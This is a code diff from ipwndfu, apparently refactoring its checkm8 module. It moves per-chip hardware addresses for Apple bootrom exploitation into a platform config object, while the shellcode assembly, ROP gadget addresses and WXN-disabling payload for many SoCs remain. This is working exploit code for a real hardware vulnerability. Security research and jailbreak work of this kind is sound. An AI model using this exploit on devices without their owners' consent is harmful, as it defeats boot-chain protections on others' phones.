@@ -7,12 +7,13 @@ import pkgutil
 import struct
 import sys
 import time
+import typing
 from contextlib import suppress
 from typing import TYPE_CHECKING, Optional, Tuple, Union
 
 import usb  # type: ignore
 
-from ipwndfu import dfu
+from ipwndfu import device_platform, dfu
 from ipwndfu.utilities import from_hex_str
 
 if TYPE_CHECKING:
@@ -22,6 +23,44 @@ if TYPE_CHECKING:
 request = None
 transfer_ptr = None
 never_free_device = None
+
+
+@dataclasses.dataclass
+class Checkm8Constants:
+    usb_descriptors: int
+    usb_serial_number: int
+    usb_create_string_descriptor: int
+    usb_srnm_string_descriptor: int
+    payload_destination: int
+    payload_offset: int
+    payload_size: int
+    payload_pointer: int
+
+    @property
+    def values(self) -> list[int]:
+        return list(dataclasses.astuple(self))
+
+
+@dataclasses.dataclass
+class Checkm8Overwrite:
+    preamble: int
+    pack: str
+    args: typing.List[Union[str, int]]
+
+
+@dataclasses.dataclass
+class Checkm8:
+    constants: Checkm8Constants
+    overwrite: Checkm8Overwrite
+    hole: typing.Optional[int] = None
+    leak: typing.Optional[int] = None
+    large_leak: typing.Optional[int] = None
+
+    def __post_init__(self):
+        if isinstance(self.constants, dict):
+            self.constants = Checkm8Constants(**self.constants)
+        if isinstance(self.overwrite, dict):
+            self.overwrite = Checkm8Overwrite(**self.overwrite)
 
 
 def libusb1_create_ctrl_transfer(device: "Device", request, timeout):
@@ -144,9 +183,7 @@ def asm_thumb_trampoline(src, dest):
         return struct.pack("<2I", 0xF002F8DF, dest)
 
 
-def prepare_shellcode(name: str, constants: Optional[list[int]] = None) -> bytes:
-    if constants is None:
-        constants = []
+def prepare_shellcode(name: str, constants: list[int]) -> bytes:
     if name.endswith("_armv7"):
         fmt = "<%sI"
         size = 4
@@ -223,31 +260,20 @@ PAYLOAD_SIZE_ARM64 = 0x240
 
 
 def payload(cpid: int) -> bytes:
+    this_platform = device_platform.DevicePlatform.platform_for_cpid(cpid)
+
+    assert this_platform
+
+    checkm8_config = Checkm8(**this_platform.exploit_configs["checkm8"])
+    checkm8_constants = checkm8_config.constants
+
     if cpid == 0x8947:
-        constants_usb_s5l8947x = [
-            0x34000000,  # 1 - LOAD_ADDRESS
-            0x65786563,  # 2 - EXEC_MAGIC
-            0x646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D73,  # 5 - MEMS_MAGIC
-            0x79EC + 1,  # 6 - USB_CORE_DO_IO
-        ]
-        constants_checkm8_s5l8947x = [
-            0x3402D87C,  # 1 - gUSBDescriptors
-            0x3402DDF8,  # 2 - gUSBSerialNumber
-            0x72A8 + 1,  # 3 - usb_create_string_descriptor
-            0x3402C2DA,  # 4 - gUSBSRNMStringDescriptor
-            0x34039800,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARMV7,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARMV7,  # 7 - PAYLOAD_SIZE
-            0x3402D92C,  # 8 - PAYLOAD_PTR
-        ]
         s5l8947x_handler = (
             asm_thumb_trampoline(0x34039800 + 1, 0x7BC8 + 1)
-            + prepare_shellcode("usb_0xA1_2_armv7", constants_usb_s5l8947x)[8:]
+            + prepare_shellcode("usb_0xA1_2_armv7", this_platform.usb.constants)[8:]
         )
         s5l8947x_shellcode = prepare_shellcode(
-            "checkm8_armv7", constants_checkm8_s5l8947x
+            "checkm8_armv7", checkm8_constants.values
         )
         assert len(s5l8947x_shellcode) <= PAYLOAD_OFFSET_ARMV7
         assert len(s5l8947x_handler) <= PAYLOAD_SIZE_ARMV7
@@ -256,31 +282,14 @@ def payload(cpid: int) -> bytes:
             + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8947x_shellcode))
             + s5l8947x_handler
         )
+
     if cpid == 0x8950:
-        constants_usb_s5l8950x = [
-            0x10000000,  # 1 - LOAD_ADDRESS
-            0x65786563,  # 2 - EXEC_MAGIC
-            0x646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D73,  # 5 - MEMS_MAGIC
-            0x7620 + 1,  # 6 - USB_CORE_DO_IO
-        ]
-        constants_checkm8_s5l8950x = [
-            0x10061988,  # 1 - gUSBDescriptors
-            0x10061F80,  # 2 - gUSBSerialNumber
-            0x7C54 + 1,  # 3 - usb_create_string_descriptor
-            0x100600D8,  # 4 - gUSBSRNMStringDescriptor
-            0x10079800,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARMV7,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARMV7,  # 7 - PAYLOAD_SIZE
-            0x10061A24,  # 8 - PAYLOAD_PTR
-        ]
         s5l8950x_handler = (
             asm_thumb_trampoline(0x10079800 + 1, 0x8160 + 1)
-            + prepare_shellcode("usb_0xA1_2_armv7", constants_usb_s5l8950x)[8:]
+            + prepare_shellcode("usb_0xA1_2_armv7", this_platform.usb.constants)[8:]
         )
         s5l8950x_shellcode = prepare_shellcode(
-            "checkm8_armv7", constants_checkm8_s5l8950x
+            "checkm8_armv7", checkm8_constants.values
         )
         assert len(s5l8950x_shellcode) <= PAYLOAD_OFFSET_ARMV7
         assert len(s5l8950x_handler) <= PAYLOAD_SIZE_ARMV7
@@ -289,31 +298,14 @@ def payload(cpid: int) -> bytes:
             + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8950x_shellcode))
             + s5l8950x_handler
         )
+
     if cpid == 0x8955:
-        constants_usb_s5l8955x = [
-            0x10000000,  # 1 - LOAD_ADDRESS
-            0x65786563,  # 2 - EXEC_MAGIC
-            0x646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D73,  # 5 - MEMS_MAGIC
-            0x7660 + 1,  # 6 - USB_CORE_DO_IO
-        ]
-        constants_checkm8_s5l8955x = [
-            0x10061988,  # 1 - gUSBDescriptors
-            0x10061F80,  # 2 - gUSBSerialNumber
-            0x7C94 + 1,  # 3 - usb_create_string_descriptor
-            0x100600D8,  # 4 - gUSBSRNMStringDescriptor
-            0x10079800,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARMV7,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARMV7,  # 7 - PAYLOAD_SIZE
-            0x10061A24,  # 8 - PAYLOAD_PTR
-        ]
         s5l8955x_handler = (
             asm_thumb_trampoline(0x10079800 + 1, 0x81A0 + 1)
-            + prepare_shellcode("usb_0xA1_2_armv7", constants_usb_s5l8955x)[8:]
+            + prepare_shellcode("usb_0xA1_2_armv7", this_platform.usb.constants)[8:]
         )
         s5l8955x_shellcode = prepare_shellcode(
-            "checkm8_armv7", constants_checkm8_s5l8955x
+            "checkm8_armv7", checkm8_constants.values
         )
         assert len(s5l8955x_shellcode) <= PAYLOAD_OFFSET_ARMV7
         assert len(s5l8955x_handler) <= PAYLOAD_SIZE_ARMV7
@@ -322,32 +314,15 @@ def payload(cpid: int) -> bytes:
             + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8955x_shellcode))
             + s5l8955x_handler
         )
+
     if cpid == 0x8960:
-        constants_usb_s5l8960x = [
-            0x180380000,  # 1 - LOAD_ADDRESS
-            0x6578656365786563,  # 2 - EXEC_MAGIC
-            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D736D656D73,  # 5 - MEMS_MAGIC
-            0x10000CC78,  # 6 - USB_CORE_DO_IO
-        ]
-        constants_checkm8_s5l8960x = [
-            0x180086B58,  # 1 - gUSBDescriptors
-            0x180086CDC,  # 2 - gUSBSerialNumber
-            0x10000BFEC,  # 3 - usb_create_string_descriptor
-            0x180080562,  # 4 - gUSBSRNMStringDescriptor
-            0x18037FC00,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARM64,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARM64,  # 7 - PAYLOAD_SIZE
-            0x180086C70,  # 8 - PAYLOAD_PTR
-        ]
         s5l8960x_handler = (
             asm_arm64_x7_trampoline(0x10000CFB4)
             + asm_arm64_branch(0x10, 0x0)
-            + prepare_shellcode("usb_0xA1_2_arm64", constants_usb_s5l8960x)[4:]
+            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
         )
         s5l8960x_shellcode = prepare_shellcode(
-            "checkm8_arm64", constants_checkm8_s5l8960x
+            "checkm8_arm64", checkm8_constants.values
         )
         assert len(s5l8960x_shellcode) <= PAYLOAD_OFFSET_ARM64
         assert len(s5l8960x_handler) <= PAYLOAD_SIZE_ARM64
@@ -356,30 +331,13 @@ def payload(cpid: int) -> bytes:
             + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(s5l8960x_shellcode))
             + s5l8960x_handler
         )
+
     if cpid == 0x8002:
-        constants_usb_t8002 = [
-            0x48818000,  # 1 - LOAD_ADDRESS
-            0x65786563,  # 2 - EXEC_MAGIC
-            0x646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D73,  # 5 - MEMS_MAGIC
-            0x9410 + 1,  # 6 - USB_CORE_DO_IO
-        ]
-        constants_checkm8_t8002 = [
-            0x4880629C,  # 1 - gUSBDescriptors
-            0x48802AB8,  # 2 - gUSBSerialNumber
-            0x8CA4 + 1,  # 3 - usb_create_string_descriptor
-            0x4880037A,  # 4 - gUSBSRNMStringDescriptor
-            0x48806E00,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARMV7,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARMV7,  # 7 - PAYLOAD_SIZE
-            0x48806344,  # 8 - PAYLOAD_PTR
-        ]
         t8002_handler = (
             asm_thumb_trampoline(0x48806E00 + 1, 0x95F0 + 1)
-            + prepare_shellcode("usb_0xA1_2_armv7", constants_usb_t8002)[8:]
+            + prepare_shellcode("usb_0xA1_2_armv7", this_platform.usb.constants)[8:]
         )
-        t8002_shellcode = prepare_shellcode("checkm8_armv7", constants_checkm8_t8002)
+        t8002_shellcode = prepare_shellcode("checkm8_armv7", checkm8_constants.values)
         assert len(t8002_shellcode) <= PAYLOAD_OFFSET_ARMV7
         assert len(t8002_handler) <= PAYLOAD_SIZE_ARMV7
         return (
@@ -387,30 +345,13 @@ def payload(cpid: int) -> bytes:
             + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(t8002_shellcode))
             + t8002_handler
         )
+
     if cpid == 0x8004:
-        constants_usb_t8004 = [
-            0x48818000,  # 1 - LOAD_ADDRESS
-            0x65786563,  # 2 - EXEC_MAGIC
-            0x646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D73,  # 5 - MEMS_MAGIC
-            0x85A0 + 1,  # 6 - USB_CORE_DO_IO
-        ]
-        constants_checkm8_t8004 = [
-            0x488062DC,  # 1 - gUSBDescriptors
-            0x48802AE8,  # 2 - gUSBSerialNumber
-            0x7E34 + 1,  # 3 - usb_create_string_descriptor
-            0x488003CA,  # 4 - gUSBSRNMStringDescriptor
-            0x48806E00,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARMV7,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARMV7,  # 7 - PAYLOAD_SIZE
-            0x48806384,  # 8 - PAYLOAD_PTR
-        ]
         t8004_handler = (
             asm_thumb_trampoline(0x48806E00 + 1, 0x877C + 1)
-            + prepare_shellcode("usb_0xA1_2_armv7", constants_usb_t8004)[8:]
+            + prepare_shellcode("usb_0xA1_2_armv7", this_platform.usb.constants)[8:]
         )
-        t8004_shellcode = prepare_shellcode("checkm8_armv7", constants_checkm8_t8004)
+        t8004_shellcode = prepare_shellcode("checkm8_armv7", checkm8_constants.values)
         assert len(t8004_shellcode) <= PAYLOAD_OFFSET_ARMV7
         assert len(t8004_handler) <= PAYLOAD_SIZE_ARMV7
         return (
@@ -418,25 +359,8 @@ def payload(cpid: int) -> bytes:
             + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(t8004_shellcode))
             + t8004_handler
         )
+
     if cpid == 0x8010:
-        constants_usb_t8010 = [
-            0x1800B0000,  # 1 - LOAD_ADDRESS
-            0x6578656365786563,  # 2 - EXEC_MAGIC
-            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D736D656D73,  # 5 - MEMS_MAGIC
-            0x10000DC98,  # 6 - USB_CORE_DO_IO
-        ]
-        constants_checkm8_t8010 = [
-            0x180088A30,  # 1 - gUSBDescriptors
-            0x180083CF8,  # 2 - gUSBSerialNumber
-            0x10000D150,  # 3 - usb_create_string_descriptor
-            0x1800805DA,  # 4 - gUSBSRNMStringDescriptor
-            0x1800AFC00,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARM64,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARM64,  # 7 - PAYLOAD_SIZE
-            0x180088B48,  # 8 - PAYLOAD_PTR
-        ]
         t8010_func_gadget = 0x10000CC4C
         t8010_enter_critical_section = 0x10000A4B8
         t8010_exit_critical_section = 0x10000A514
@@ -460,9 +384,9 @@ def payload(cpid: int) -> bytes:
         t8010_handler = (
             asm_arm64_x7_trampoline(t8010_handle_interface_request)
             + asm_arm64_branch(0x10, 0x0)
-            + prepare_shellcode("usb_0xA1_2_arm64", constants_usb_t8010)[4:]
+            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
         )
-        t8010_shellcode = prepare_shellcode("checkm8_arm64", constants_checkm8_t8010)
+        t8010_shellcode = prepare_shellcode("checkm8_arm64", checkm8_constants.values)
         assert len(t8010_shellcode) <= PAYLOAD_OFFSET_ARM64
         assert len(t8010_handler) <= PAYLOAD_SIZE_ARM64
         t8010_shellcode = (
@@ -477,27 +401,9 @@ def payload(cpid: int) -> bytes:
             0x1000006A5,
             0x60000180000625,
             0x1800006A5,
-            prepare_shellcode("t8010_t8011_disable_wxn_arm64"),
+            prepare_shellcode("t8010_t8011_disable_wxn_arm64", []),
         ) + usb_rop_callbacks(0x1800B0800, t8010_func_gadget, t8010_callbacks)
     if cpid == 0x8011:
-        constants_usb_t8011 = [
-            0x1800B0000,  # 1 - LOAD_ADDRESS
-            0x6578656365786563,  # 2 - EXEC_MAGIC
-            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D736D656D73,  # 5 - MEMS_MAGIC
-            0x10000DD64,  # 6 - USB_CORE_DO_IO
-        ]
-        constants_checkm8_t8011 = [
-            0x180088948,  # 1 - gUSBDescriptors
-            0x180083D28,  # 2 - gUSBSerialNumber
-            0x10000D234,  # 3 - usb_create_string_descriptor
-            0x18008062A,  # 4 - gUSBSRNMStringDescriptor
-            0x1800AFC00,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARM64,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARM64,  # 7 - PAYLOAD_SIZE
-            0x180088A58,  # 8 - PAYLOAD_PTR
-        ]
         t8011_func_gadget = 0x10000CCEC
         t8011_dc_civac = 0x10000047C
         t8011_write_ttbr0 = 0x1000003F4
@@ -519,9 +425,9 @@ def payload(cpid: int) -> bytes:
         t8011_handler = (
             asm_arm64_x7_trampoline(t8011_handle_interface_request)
             + asm_arm64_branch(0x10, 0x0)
-            + prepare_shellcode("usb_0xA1_2_arm64", constants_usb_t8011)[4:]
+            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
         )
-        t8011_shellcode = prepare_shellcode("checkm8_arm64", constants_checkm8_t8011)
+        t8011_shellcode = prepare_shellcode("checkm8_arm64", checkm8_constants.values)
         assert len(t8011_shellcode) <= PAYLOAD_OFFSET_ARM64
         assert len(t8011_handler) <= PAYLOAD_SIZE_ARM64
         t8011_shellcode = (
@@ -536,34 +442,17 @@ def payload(cpid: int) -> bytes:
             0x1000006A5,
             0x60000180000625,
             0x1800006A5,
-            prepare_shellcode("t8010_t8011_disable_wxn_arm64"),
+            prepare_shellcode("t8010_t8011_disable_wxn_arm64", []),
         ) + usb_rop_callbacks(0x1800B0800, t8011_func_gadget, t8011_callbacks)
+
     if cpid == 0x7000:
-        constants_usb_s7000 = [
-            0x180380000,  # 1 - LOAD_ADDRESS
-            0x6578656365786563,  # 2 - EXEC_MAGIC
-            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D736D656D73,  # 5 - MEMS_MAGIC
-            0x10000EBB4,  # 6 - USB_CORE_DO_IO
-        ]
-        constants_checkm8_s7000 = [
-            0x180088760,  # 1 - gUSBDescriptors
-            0x1800888C8,  # 2 - gUSBSerialNumber
-            0x10000E074,  # 3 - usb_create_string_descriptor
-            0x18008062A,  # 4 - gUSBSRNMStringDescriptor
-            0x1800E0C00,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARM64,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARM64,  # 7 - PAYLOAD_SIZE
-            0x180088878,  # 8 - PAYLOAD_PTR
-        ]
         s7000_handler = (
             asm_arm64_x7_trampoline(0x10000EEE4)
             + asm_arm64_branch(0x10, 0x0)
-            + prepare_shellcode("usb_0xA1_2_arm64", constants_usb_s7000)[4:]
+            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
         )
         s7000_shellcode = prepare_shellcode(
-            "checkm8_nopaddingcorruption_arm64", constants_checkm8_s7000
+            "checkm8_nopaddingcorruption_arm64", checkm8_constants.values
         )
         assert len(s7000_shellcode) <= PAYLOAD_OFFSET_ARM64
         assert len(s7000_handler) <= PAYLOAD_SIZE_ARM64
@@ -574,31 +463,13 @@ def payload(cpid: int) -> bytes:
         )
 
     if cpid == 0x8003:
-        constants_usb_s8003 = [
-            0x180380000,  # 1 - LOAD_ADDRESS
-            0x6578656365786563,  # 2 - EXEC_MAGIC
-            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D736D656D73,  # 5 - MEMS_MAGIC
-            0x10000EE78,  # 6 - USB_CORE_DO_IO
-        ]
-        constants_checkm8_s8003 = [
-            0x1800877E0,  # 1 - gUSBDescriptors
-            0x180087958,  # 2 - gUSBSerialNumber
-            0x10000E354,  # 3 - usb_create_string_descriptor
-            0x1800807DA,  # 4 - gUSBSRNMStringDescriptor
-            0x1800E0C00,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARM64,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARM64,  # 7 - PAYLOAD_SIZE
-            0x1800878F8,  # 8 - PAYLOAD_PTR
-        ]
         s8003_handler = (
             asm_arm64_x7_trampoline(0x10000F1B0)
             + asm_arm64_branch(0x10, 0x0)
-            + prepare_shellcode("usb_0xA1_2_arm64", constants_usb_s8003)[4:]
+            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
         )
         s8003_shellcode = prepare_shellcode(
-            "checkm8_nopaddingcorruption_arm64", constants_checkm8_s8003
+            "checkm8_nopaddingcorruption_arm64", checkm8_constants.values
         )
 
         assert len(s8003_shellcode) <= PAYLOAD_OFFSET_ARM64
@@ -610,25 +481,8 @@ def payload(cpid: int) -> bytes:
             + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(s8003_shellcode))
             + s8003_handler
         )
+
     if cpid == 0x8012:
-        constants_usb_t8012 = [
-            0x18001C000,  # 1 - LOAD_ADDRESS
-            0x6578656365786563,  # 2 - EXEC_MAGIC
-            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D736D656D73,  # 5 - MEMS_MAGIC
-            0x10000BD20,  # 6 - USB_CORE_DO_IO
-        ]
-        constants_checkm8_t8012 = [
-            0x1800089F8,  # 1 - gUSBDescriptors
-            0x180003AF8,  # 2 - gUSBSerialNumber
-            0x10000B1CC,  # 3 - usb_create_string_descriptor
-            0x18000082A,  # 4 - gUSBSRNMStringDescriptor
-            0x18001BC00,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARM64,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARM64,  # 7 - PAYLOAD_SIZE
-            0x180008B08,  # 8 - PAYLOAD_PTR
-        ]
         t8012_func_gadget = 0x100008DA0
         t8012_write_ttbr0 = 0x100000444
         t8012_tlbi = t8012_write_ttbr0 + 0x50
@@ -650,9 +504,9 @@ def payload(cpid: int) -> bytes:
         t8012_handler = (
             asm_arm64_x7_trampoline(t8012_handle_interface_request)
             + asm_arm64_branch(0x10, 0x0)
-            + prepare_shellcode("usb_0xA1_2_arm64", constants_usb_t8012)[4:]
+            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
         )
-        t8012_shellcode = prepare_shellcode("checkm8_arm64", constants_checkm8_t8012)
+        t8012_shellcode = prepare_shellcode("checkm8_arm64", checkm8_constants.values)
         assert len(t8012_shellcode) <= PAYLOAD_OFFSET_ARM64
         assert len(t8012_handler) <= PAYLOAD_SIZE_ARM64
         t8012_shellcode = (
@@ -669,25 +523,8 @@ def payload(cpid: int) -> bytes:
             0x180000625,
             ttbr_patch_code,
         ) + usb_rop_callbacks(0x18001C800, t8012_func_gadget, t8012_callbacks)
+
     if cpid == 0x8015:
-        constants_usb_t8015 = [
-            0x18001C000,  # 1 - LOAD_ADDRESS
-            0x6578656365786563,  # 2 - EXEC_MAGIC
-            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
-            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
-            0x6D656D736D656D73,  # 5 - MEMS_MAGIC
-            0x10000B9A8,  # 6 - USB_CORE_DO_IO
-        ]
-        constants_checkm8_t8015 = [
-            0x180008528,  # 1 - gUSBDescriptors
-            0x180003A78,  # 2 - gUSBSerialNumber
-            0x10000AE80,  # 3 - usb_create_string_descriptor
-            0x1800008FA,  # 4 - gUSBSRNMStringDescriptor
-            0x18001BC00,  # 5 - PAYLOAD_DEST
-            PAYLOAD_OFFSET_ARM64,  # 6 - PAYLOAD_OFFSET
-            PAYLOAD_SIZE_ARM64,  # 7 - PAYLOAD_SIZE
-            0x180008638,  # 8 - PAYLOAD_PTR
-        ]
         t8015_load_write_gadget = 0x10000945C
         t8015_write_sctlr_gadget = 0x1000003EC
         t8015_func_gadget = 0x10000A9AC
@@ -717,9 +554,9 @@ def payload(cpid: int) -> bytes:
         t8015_handler = (
             asm_arm64_x7_trampoline(t8015_handle_interface_request)
             + asm_arm64_branch(0x10, 0x0)
-            + prepare_shellcode("usb_0xA1_2_arm64", constants_usb_t8015)[4:]
+            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
         )
-        t8015_shellcode = prepare_shellcode("checkm8_arm64", constants_checkm8_t8015)
+        t8015_shellcode = prepare_shellcode("checkm8_arm64", checkm8_constants.values)
         assert len(t8015_shellcode) <= PAYLOAD_OFFSET_ARM64
         assert len(t8015_handler) <= PAYLOAD_SIZE_ARM64
         t8015_shellcode = (
